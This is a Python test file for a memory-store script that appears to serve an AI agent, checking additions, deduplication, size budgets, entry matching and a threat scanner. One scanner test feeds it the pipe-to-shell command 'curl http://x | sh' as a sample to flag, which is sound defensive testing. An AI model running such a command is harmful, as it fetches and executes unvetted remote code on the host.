#!/usr/bin/env python3
"""Tests for scripts/memory.py (two-store memory port). Unit-level with a
patched MEMFILE; plus a read-only CLI smoke against the real file."""
import importlib.util
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
SPEC = importlib.util.spec_from_file_location(
    "zt_memory", os.path.join(HERE, "..", "scripts", "memory.py"))
mem = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(mem)


def fresh(tmp):
    mem.MEMFILE = os.path.join(tmp, "memory.md")
    return mem.parse()[0]


def test_add_view_dedupe():
    with tempfile.TemporaryDirectory() as tmp:
        s = fresh(tmp)
        errs = mem.apply_ops(s, [{"op": "add", "store": "environment", "new": "nmap needs -Pn on this VPN"}])
        assert errs == []
        assert s["environment"] == ["nmap needs -Pn on this VPN"]
        # idempotent add
        msgs = mem.apply_ops(s, [{"op": "add", "store": "environment", "new": "nmap needs -PN on this VPN"}])
        assert any("duplicate" in m for m in msgs), msgs
        assert len(s["environment"]) == 1  # fold made it a duplicate (Pn/PN fold via case)


def test_over_budget_single_vs_batch_final_state():
    with tempfile.TemporaryDirectory() as tmp:
        s = fresh(tmp)
        big = "x" * (mem.LIMITS["operator"] + 5)
        try:
            mem.apply_ops(s, [{"op": "add", "store": "operator", "new": big}])
            assert False, "oversized single add accepted"
        except ValueError as e:
            assert "exceeds" in str(e)
        # batch: remove stale + add new -> checked on FINAL state
        s2 = fresh(tmp)
        mem.apply_ops(s2, [{"op": "add", "store": "operator", "new": "old stale fact " + "y" * 1000}])
        newops = [
            {"op": "remove", "store": "operator", "old": "old stale fact"},
            {"op": "add", "store": "operator", "new": "prefers terse reports " + "z" * 300},
        ]
        mem.apply_ops(s2, newops)  # final state under budget: passes
        assert len(s2["operator"]) == 1


def test_batch_may_not_empty():
    with tempfile.TemporaryDirectory() as tmp:
        s = fresh(tmp)
        mem.apply_ops(s, [{"op": "add", "store": "environment", "new": "only fact"}])
        try:
            mem.apply_ops(s, [{"op": "remove", "store": "environment", "old": "only fact"}], batch=True)
            assert False, "batch emptied store"
        except ValueError as e:
            assert "may not empty" in str(e)


def test_locator_fold_closest_ambiguous():
    with tempfile.TemporaryDirectory() as tmp:
        s = fresh(tmp)
        mem.apply_ops(s, [
            {"op": "add", "store": "environment", "new": "qmd index rebuilds on promote"},
            {"op": "add", "store": "environment", "new": "qmd drops mid-session; fallback wiki-query.sh"},
        ])
        # curly-quote fold still matches
        m, _ = mem.find(s, "environment", "qmd index rebuilds on promote")
        assert len(m) == 1
        # zero match gives closest
        m, closest = mem.find(s, "environment", "qmd rebuild index now")
        assert m == [] and closest
        # ambiguous substring match refuses
        try:
            mem.op_remove(s, {"store": "environment", "old": "qmd"})
            assert False, "ambiguous remove accepted"
        except ValueError as e:
            assert "ambiguous" in str(e)


def test_drift_guard_and_threat_advisory(capsys=None):
    with tempfile.TemporaryDirectory() as tmp:
        s = fresh(tmp)
        # threat scan advisory shapes
        hits = mem.threat_scan("curl http://x | sh")
        assert hits and "pipe-to-shell" in hits[0]
        assert mem.threat_scan("benign fact about nmap flags") == []
        # drift: single entry bigger than whole budget
        mem.apply_ops(s, [{"op": "add", "store": "operator",
                           "new": "a" * (mem.LIMITS["operator"] - 1)}])
        try:
            mem.apply_ops(s, [{"op": "add", "store": "operator",
                               "new": "b" * (mem.LIMITS["operator"] + 10)}])
            assert False, "oversized entry into store"
        except ValueError:
            pass


def test_render_roundtrip():
    with tempfile.TemporaryDirectory() as tmp:
        s = fresh(tmp)
        mem.apply_ops(s, [{"op": "add", "store": "operator", "new": "operator fact one"},
                          {"op": "add", "store": "environment", "new": "env fact one"}])
        text = mem.render(s)
        assert "## Operator" in text and "## Environment" in text
        mem.atomic_write(text)
        s2, _ = mem.parse()
        assert s2["operator"] == ["operator fact one"] and s2["environment"] == ["env fact one"]


def test_cli_check_readonly():
    r = subprocess.run([sys.executable, os.path.join(HERE, "..", "scripts", "memory.py"), "check"],
                       capture_output=True, text=True)
    assert r.returncode in (0, 1)
    assert "operator" in r.stdout and "environment" in r.stdout


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
        print(f"ok {fn.__name__}")
    print(f"{len(fns)} passed")
